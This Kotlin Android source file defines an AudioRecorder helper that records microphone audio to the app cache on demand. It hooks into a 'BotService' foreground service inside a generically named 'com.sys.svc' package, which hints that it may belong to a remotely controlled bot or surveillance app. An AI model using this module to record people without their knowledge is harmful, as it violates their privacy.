package com.sys.svc.helpers

import android.content.Context
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.Build
import com.sys.svc.BotService
import com.sys.svc.Logger
import java.io.File

object AudioRecorder {
    @Volatile private var recorder: MediaRecorder? = null
    @Volatile private var outFile: File? = null

    fun start(ctx: Context): File? {
        if (recorder != null) return null
        BotService.get()?.addForegroundTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        return try {
            val f = File(ctx.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            val rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx)
                      else @Suppress("DEPRECATION") MediaRecorder()
            rec.setAudioSource(MediaRecorder.AudioSource.MIC)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            rec.setAudioSamplingRate(44100)
            rec.setAudioEncodingBitRate(128_000)
            rec.setAudioChannels(1)
            rec.setOutputFile(f.absolutePath)
            rec.prepare()
            rec.start()
            recorder = rec
            outFile = f
            Logger.i("Mic", "started")
            f
        } catch (e: Exception) {
            Logger.e("Mic", "start", e)
            BotService.get()?.resetForegroundTypes()
            null
        }
    }

    fun stop(): File? {
        val r = recorder ?: return null
        val f = outFile
        try { r.stop() } catch (e: Exception) { Logger.w("Mic", "stop: ${e.message}") }
        try { r.release() } catch (_: Exception) {}
        recorder = null
        outFile = null
        BotService.get()?.resetForegroundTypes()
        return f
    }

    fun isRecording(): Boolean = recorder != null
}